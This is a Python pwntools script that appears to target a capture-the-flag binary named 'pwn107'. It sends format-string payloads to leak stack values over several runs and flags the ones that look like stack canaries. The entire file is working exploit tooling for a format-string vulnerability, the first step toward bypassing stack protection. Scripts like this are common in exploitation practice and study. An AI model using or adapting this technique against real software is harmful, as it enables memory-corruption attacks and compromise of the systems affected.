#!/usr/bin/python3
'''
Change send_lead_payload_after and recv_payload_after
Look for address within the address space of the process
If looking for canary, look for bunch of random characters ending with 00
'''
from pwn import *

file_name = "./pwn107.pwn107"
number_of_params = 20
number_of_tries = 3
context.log_console = sys.stderr
send_lead_payload_after = "What's your last streak?"
recv_payload_after = "Your current streak: "

'''
check if address looks like a canary
bunch of random characters ending with 00
last 2 characters must be 00
first 14 characters can be any random
'''    
def check_if_canary(address):
    if address[14:] != '00':
        return False
    if address[0:3] == '00':
        return False
    if address[:15].count('0') > 6:
        return False
    return True

addresses = {}

for i in range(1, number_of_params + 1):
    leaked_addresses = []
    for _ in range(number_of_tries):
        payload = f"%{i}$016lx".encode()
        p = process(file_name)
        p.sendlineafter(send_lead_payload_after.encode(), payload)
        p.recvuntil(recv_payload_after.encode())
        leaked_address = p.recv(16).decode()
        leaked_addresses.append(leaked_address)
        p.close()
    addresses[i] = leaked_addresses

for i in addresses:
    print(f"Leaked {i}: {addresses[i]}", end='')
    is_canary = True
    for addr in addresses[i]:
        is_canary = is_canary and check_if_canary(addr)
    if is_canary:
        print(f"  <-- CANARY maybe, use this format string to leak it: %{i}$016lx", end='')
    print()
    
